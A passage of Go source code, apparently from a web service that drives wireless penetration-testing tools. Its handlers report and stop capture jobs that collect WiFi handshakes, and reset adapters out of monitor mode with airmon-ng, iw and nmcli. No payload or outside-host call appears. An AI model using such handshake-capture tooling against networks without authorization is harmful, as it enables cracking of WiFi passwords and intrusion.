		copy(hs, job.handshakes)
		done := job.done
		job.mu.Unlock()

		outData, _ := encodeJSON(out)
		hsData, _ := encodeJSON(hs)
		status := "running"
		if done {
			status = "done"
		}
		fmt.Fprintf(w, `{"status":%q,"output":%s,"handshakes":%s}`, status, outData, hsData)
	}
}

func handleStopWifiCapture(db *DB) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		sessionID, err := strconv.Atoi(chi.URLParam(r, "id"))
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"invalid session id"}`)
			return
		}
		if _, err := validateToken(extractToken(r)); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}
		v, ok := wifiCaptureJobs.Load(sessionID)
		if !ok {
			fmt.Fprint(w, `{"status":"idle"}`)
			return
		}
		job := v.(*WifiCaptureJob)
		job.mu.Lock()
		for _, cmd := range job.cmds {
			if cmd != nil && cmd.Process != nil {
				cmd.Process.Kill()
			}
		}
		job.done = true
		job.mu.Unlock()
		fmt.Fprint(w, `{"status":"stopped"}`)
	}
}

// handleResetWifiAdapters kills interfering processes, stops any monitor-mode
// interfaces via airmon-ng, then restores every adapter to managed mode and
// re-enables NetworkManager control.
func handleResetWifiAdapters() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		claims, err := validateToken(extractToken(r))
		if err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, `{"error":"Invalid token"}`)
			return
		}

		var log []string
		run := func(name string, args ...string) {
			out, err := sudoRun(claims.UserID, name, args...)
			line := strings.TrimSpace(string(out))
			status := "ok"
			if err != nil {
				status = err.Error()
			}
			entry := fmt.Sprintf("[%s %s] %s", name, strings.Join(args, " "), status)
			if line != "" {
				entry += ": " + line
			}
			log = append(log, entry)
		}

		// 1. Kill processes that hold adapters in monitor mode.
		run("airmon-ng", "check", "kill")

		// 2. Find all WiFi interfaces and their current types via `iw dev`.
		iwOut, _ := exec.Command("iw", "dev").Output()
		type iwIface struct{ name, kind string }
		var ifaces []iwIface
		var cur string
		for _, l := range strings.Split(string(iwOut), "\n") {
			t := strings.TrimSpace(l)
			if strings.HasPrefix(t, "Interface ") {
				cur = strings.TrimPrefix(t, "Interface ")
			} else if strings.HasPrefix(t, "type ") && cur != "" {
				ifaces = append(ifaces, iwIface{cur, strings.TrimPrefix(t, "type ")})
				cur = ""
			}
		}

		if len(ifaces) == 0 {
			log = append(log, "[iw dev] no wireless interfaces found")
		}

		// 3. For each interface: stop monitor mode (airmon-ng), set to managed, re-enable NM.
		for _, iface := range ifaces {
			log = append(log, fmt.Sprintf("[%s] type=%s — resetting", iface.name, iface.kind))

			if iface.kind == "monitor" {
				run("airmon-ng", "stop", iface.name)
			}

			run("ip", "link", "set", iface.name, "down")
			run("iw", iface.name, "set", "type", "managed")
			run("ip", "link", "set", iface.name, "up")
			run("nmcli", "device", "set", iface.name, "managed", "yes")
		}

		// 4. Restart NetworkManager so it picks up all interfaces cleanly.
		run("systemctl", "restart", "NetworkManager.service")

		output := strings.Join(log, "\n")
		outData, _ := encodeJSON(output)
		fmt.Fprintf(w, `{"status":"ok","output":%s}`, outData)
	}
}
